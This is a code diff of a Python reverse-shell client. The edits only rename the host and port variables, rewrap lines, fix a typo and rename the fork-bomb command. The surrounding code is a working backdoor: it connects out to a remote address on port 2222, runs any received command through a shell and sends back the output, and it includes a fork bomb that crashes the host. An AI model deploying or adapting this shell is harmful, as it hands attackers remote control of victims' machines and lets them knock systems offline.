@@ -8,20 +8,21 @@ from colorama import Fore, Style
 from time import sleep
 
 colorama.init()
-RHOST = input("Provide the remote IP Address: ")
-RPORT = 2222
+R_HOST = input("Provide the remote IP Address: ")
+R_PORT = 2222
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((RHOST, RPORT))
+sock.connect((R_HOST, R_PORT))
 while True:
     try:
-        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
+        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}
+{Style.RESET_ALL}$ """
         sock.send(header.encode())
         STDOUT, STDERR = None, None
         cmd = sock.recv(1024).decode("utf-8")
         if cmd == "list":  # List files in the dir
             sock.send(str(os.listdir(".")).encode())
 
-        if cmd == "forkbomb":  # Forkbomb
+        if cmd == "fork bomb":
             while True:
                 os.fork()
         elif cmd.split(" ")[0] == "cd":  # Change directory
@@ -50,7 +51,8 @@ Processor Architecture: {platform.processor()}
             sock.send(b"exit")
             break
         else:  # Run any other command
-            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                    stdin=subprocess.PIPE)
             STDOUT, STDERR = comm.communicate()
             if not STDOUT:
                 sock.send(STDERR)
@@ -61,5 +63,5 @@ Processor Architecture: {platform.processor()}
             print("Connection dropped")
             break
     except Exception as e:
-        sock.send("An error has occured: {}".format(str(e)).encode())
+        sock.send("An error has occurred: {}".format(str(e)).encode())
 sock.close()
